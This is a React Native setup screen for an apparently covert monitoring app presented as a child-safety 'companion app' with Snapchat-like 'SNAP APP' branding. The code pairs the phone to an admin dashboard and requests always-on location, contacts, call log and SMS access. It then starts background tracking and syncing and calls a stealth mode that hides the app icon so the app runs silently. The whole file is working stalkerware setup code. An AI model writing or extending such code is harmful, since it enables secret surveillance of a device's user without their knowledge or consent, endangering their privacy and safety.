// companion-app/src/screens/SetupScreen.tsx
import React, { useState } from "react";
import {
  StyleSheet,
  Text,
  View,
  TextInput,
  TouchableOpacity,
  ActivityIndicator,
  Alert,
  ScrollView,
} from "react-native";
import AsyncStorage from "@react-native-async-storage/async-storage";
import { STORAGE_KEYS } from "../config";
import { sendHeartbeat } from "../services/api";
import { requestLocationPermissions, startBackgroundLocation } from "../services/LocationService";
import { requestContactsPermission } from "../services/ContactsService";
import { activateStealthMode } from "../services/StealthService";
import { startSyncCoordinator } from "../services/SyncCoordinator";

export const SetupScreen: React.FC = () => {
  const [pairingCode, setPairingCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [step, setStep] = useState<"pair" | "permissions" | "activate">("pair");
  const [deviceId, setDeviceId] = useState<string | null>(null);
  const [childName, setChildName] = useState<string>("");

  const handleVerifyCode = async () => {
    if (!pairingCode.trim()) {
      Alert.alert("Error", "Please enter the 6-character pairing code.");
      return;
    }

    try {
      setLoading(true);
      const res = await sendHeartbeat({ pairing_code: pairingCode.trim().toUpperCase() });
      if (res.device_id) {
        setDeviceId(res.device_id);
        setChildName(res.child_name || "Child");
        await AsyncStorage.setItem(STORAGE_KEYS.DEVICE_ID, res.device_id);
        await AsyncStorage.setItem(STORAGE_KEYS.PAIRING_CODE, pairingCode.trim().toUpperCase());
        setStep("permissions");
      } else {
        Alert.alert("Code Invalid", "Could not find a device with this code. Check your admin dashboard.");
      }
    } catch {
      Alert.alert("Connection Error", "Check internet connection and server URL.");
    } finally {
      setLoading(false);
    }
  };

  const handleGrantPermissions = async () => {
    try {
      setLoading(true);
      await requestLocationPermissions();
      await requestContactsPermission();
      setStep("activate");
    } finally {
      setLoading(false);
    }
  };

  const handleActivateAndHide = async () => {
    if (!deviceId) return;
    try {
      setLoading(true);
      await startBackgroundLocation();
      startSyncCoordinator(deviceId);
      await AsyncStorage.setItem(STORAGE_KEYS.IS_ACTIVATED, "true");
      Alert.alert(
        "Protection Active",
        "The app icon is now hiding. 24/7 background tracking and security is running.",
        [{ text: "OK", onPress: () => activateStealthMode() }]
      );
    } catch (err: any) {
      Alert.alert("Activation Error", err.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <ScrollView contentContainerStyle={styles.container}>
      <View style={styles.card}>
        <View style={styles.iconCircle}>
          <Text style={styles.ghostIcon}>👻</Text>
        </View>

        <Text style={styles.title}>System Security Setup</Text>
        <Text style={styles.subtitle}>
          {step === "pair" && "Enter the 6-character pairing code generated in the SNAP APP Admin Dashboard."}
          {step === "permissions" && `Device connected for ${childName}. Grant permissions to enable 24/7 safety.`}
          {step === "activate" && "Permissions ready. Activate stealth mode to permanently hide the app icon."}
        </Text>

        {step === "pair" && (
          <View style={styles.formSection}>
            <TextInput
              value={pairingCode}
              onChangeText={setPairingCode}
              placeholder="e.g. KD8472"
              placeholderTextColor="#666"
              autoCapitalize="characters"
              maxLength={6}
              style={styles.input}
            />
            <TouchableOpacity style={styles.button} onPress={handleVerifyCode} disabled={loading}>
              {loading ? <ActivityIndicator color="#000" /> : <Text style={styles.buttonText}>Connect Device</Text>}
            </TouchableOpacity>
          </View>
        )}

        {step === "permissions" && (
          <View style={styles.formSection}>
            <View style={styles.permList}>
              <Text style={styles.permItem}>📍 Location (Select &quot;Allow all the time&quot;)</Text>
              <Text style={styles.permItem}>📖 Contacts Access</Text>
              <Text style={styles.permItem}>📞 Phone &amp; Call Logs</Text>
              <Text style={styles.permItem}>💬 SMS Messages</Text>
            </View>
            <TouchableOpacity style={styles.button} onPress={handleGrantPermissions} disabled={loading}>
              {loading ? <ActivityIndicator color="#000" /> : <Text style={styles.buttonText}>Allow All &amp; Continue</Text>}
            </TouchableOpacity>
          </View>
        )}

        {step === "activate" && (
          <View style={styles.formSection}>
            <Text style={styles.warningText}>
              ⚠️ Once you tap below, this app icon will disappear completely from the launcher and run silently in the background.
            </Text>
            <TouchableOpacity
              style={[styles.button, styles.stealthButton]}
              onPress={handleActivateAndHide}
              disabled={loading}
            >
              {loading ? (
                <ActivityIndicator color="#000" />
              ) : (
                <Text style={styles.buttonText}>🕵️ Activate &amp; Hide App</Text>
              )}
            </TouchableOpacity>
          </View>
        )}
      </View>
    </ScrollView>
  );
};

const styles = StyleSheet.create({
  container: { flexGrow: 1, backgroundColor: "#0B0B0E", justifyContent: "center", padding: 20 },
  card: { backgroundColor: "#141418", borderRadius: 28, padding: 24, borderWidth: 1, borderColor: "rgba(255,255,255,0.08)", alignItems: "center" },
  iconCircle: { width: 64, height: 64, borderRadius: 32, backgroundColor: "#FFFC00", alignItems: "center", justifyContent: "center", marginBottom: 16 },
  ghostIcon: { fontSize: 32 },
  title: { fontSize: 20, fontWeight: "900", color: "#FFF", textAlign: "center" },
  subtitle: { fontSize: 12, color: "rgba(255,255,255,0.6)", textAlign: "center", marginTop: 8, lineHeight: 18 },
  formSection: { width: "100%", marginTop: 24 },
  input: { backgroundColor: "rgba(255,255,255,0.05)", borderWidth: 1, borderColor: "rgba(255,252,0,0.3)", borderRadius: 16, color: "#FFFC00", fontSize: 24, fontWeight: "900", textAlign: "center", letterSpacing: 6, paddingVertical: 14, marginBottom: 16 },
  button: { backgroundColor: "#FFFC00", borderRadius: 16, paddingVertical: 16, alignItems: "center", justifyContent: "center" },
  stealthButton: { backgroundColor: "#FFFC00", shadowColor: "#FFFC00", shadowOffset: { width: 0, height: 4 }, shadowOpacity: 0.4, shadowRadius: 10, elevation: 6 },
  buttonText: { color: "#000", fontWeight: "900", fontSize: 15 },
  permList: { backgroundColor: "rgba(255,255,255,0.03)", borderRadius: 16, padding: 16, marginBottom: 20 },
  permItem: { color: "rgba(255,255,255,0.8)", fontSize: 12, fontWeight: "600", marginVertical: 4 },
  warningText: { color: "#FFFC00", fontSize: 11, textAlign: "center", marginBottom: 16, lineHeight: 16 },
});
